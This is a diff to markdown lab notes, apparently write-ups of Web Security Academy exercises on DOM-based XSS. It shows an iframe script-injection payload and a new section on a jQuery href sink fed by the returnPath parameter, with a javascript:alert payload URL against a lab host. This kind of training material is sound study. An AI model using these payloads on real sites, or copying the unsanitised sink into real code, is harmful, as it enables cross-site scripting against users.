@@ -83,3 +83,18 @@ https://acaa1f4e1f5e9aa7c0c6e265002f004c.web-security-academy.net/post?postId=4&
 ```html
 <iframe src="https://acb61f151e1962a8c0e21111007b00ff.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://acb61f151e1962a8c0e21111007b00ffweb-security-academy.net';window.x=1;"> 
 ```
+
+### DOM XSS in jQuery anchor href attribute sink using location.search source
+* Vulnerable Code - We can inject JavaScript with `returnPath` parameter, and it will be added as a value to `attr()` attrobite. 
+```html
+<script>
+    $(function() {
+        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+    });
+</script>
+```
+* Payload
+```html
+https://acae1faa1ef8845fc0303f5900250072.web-security-academy.net/feedback?returnPath=javascript:alert(document.domain)
+```
+
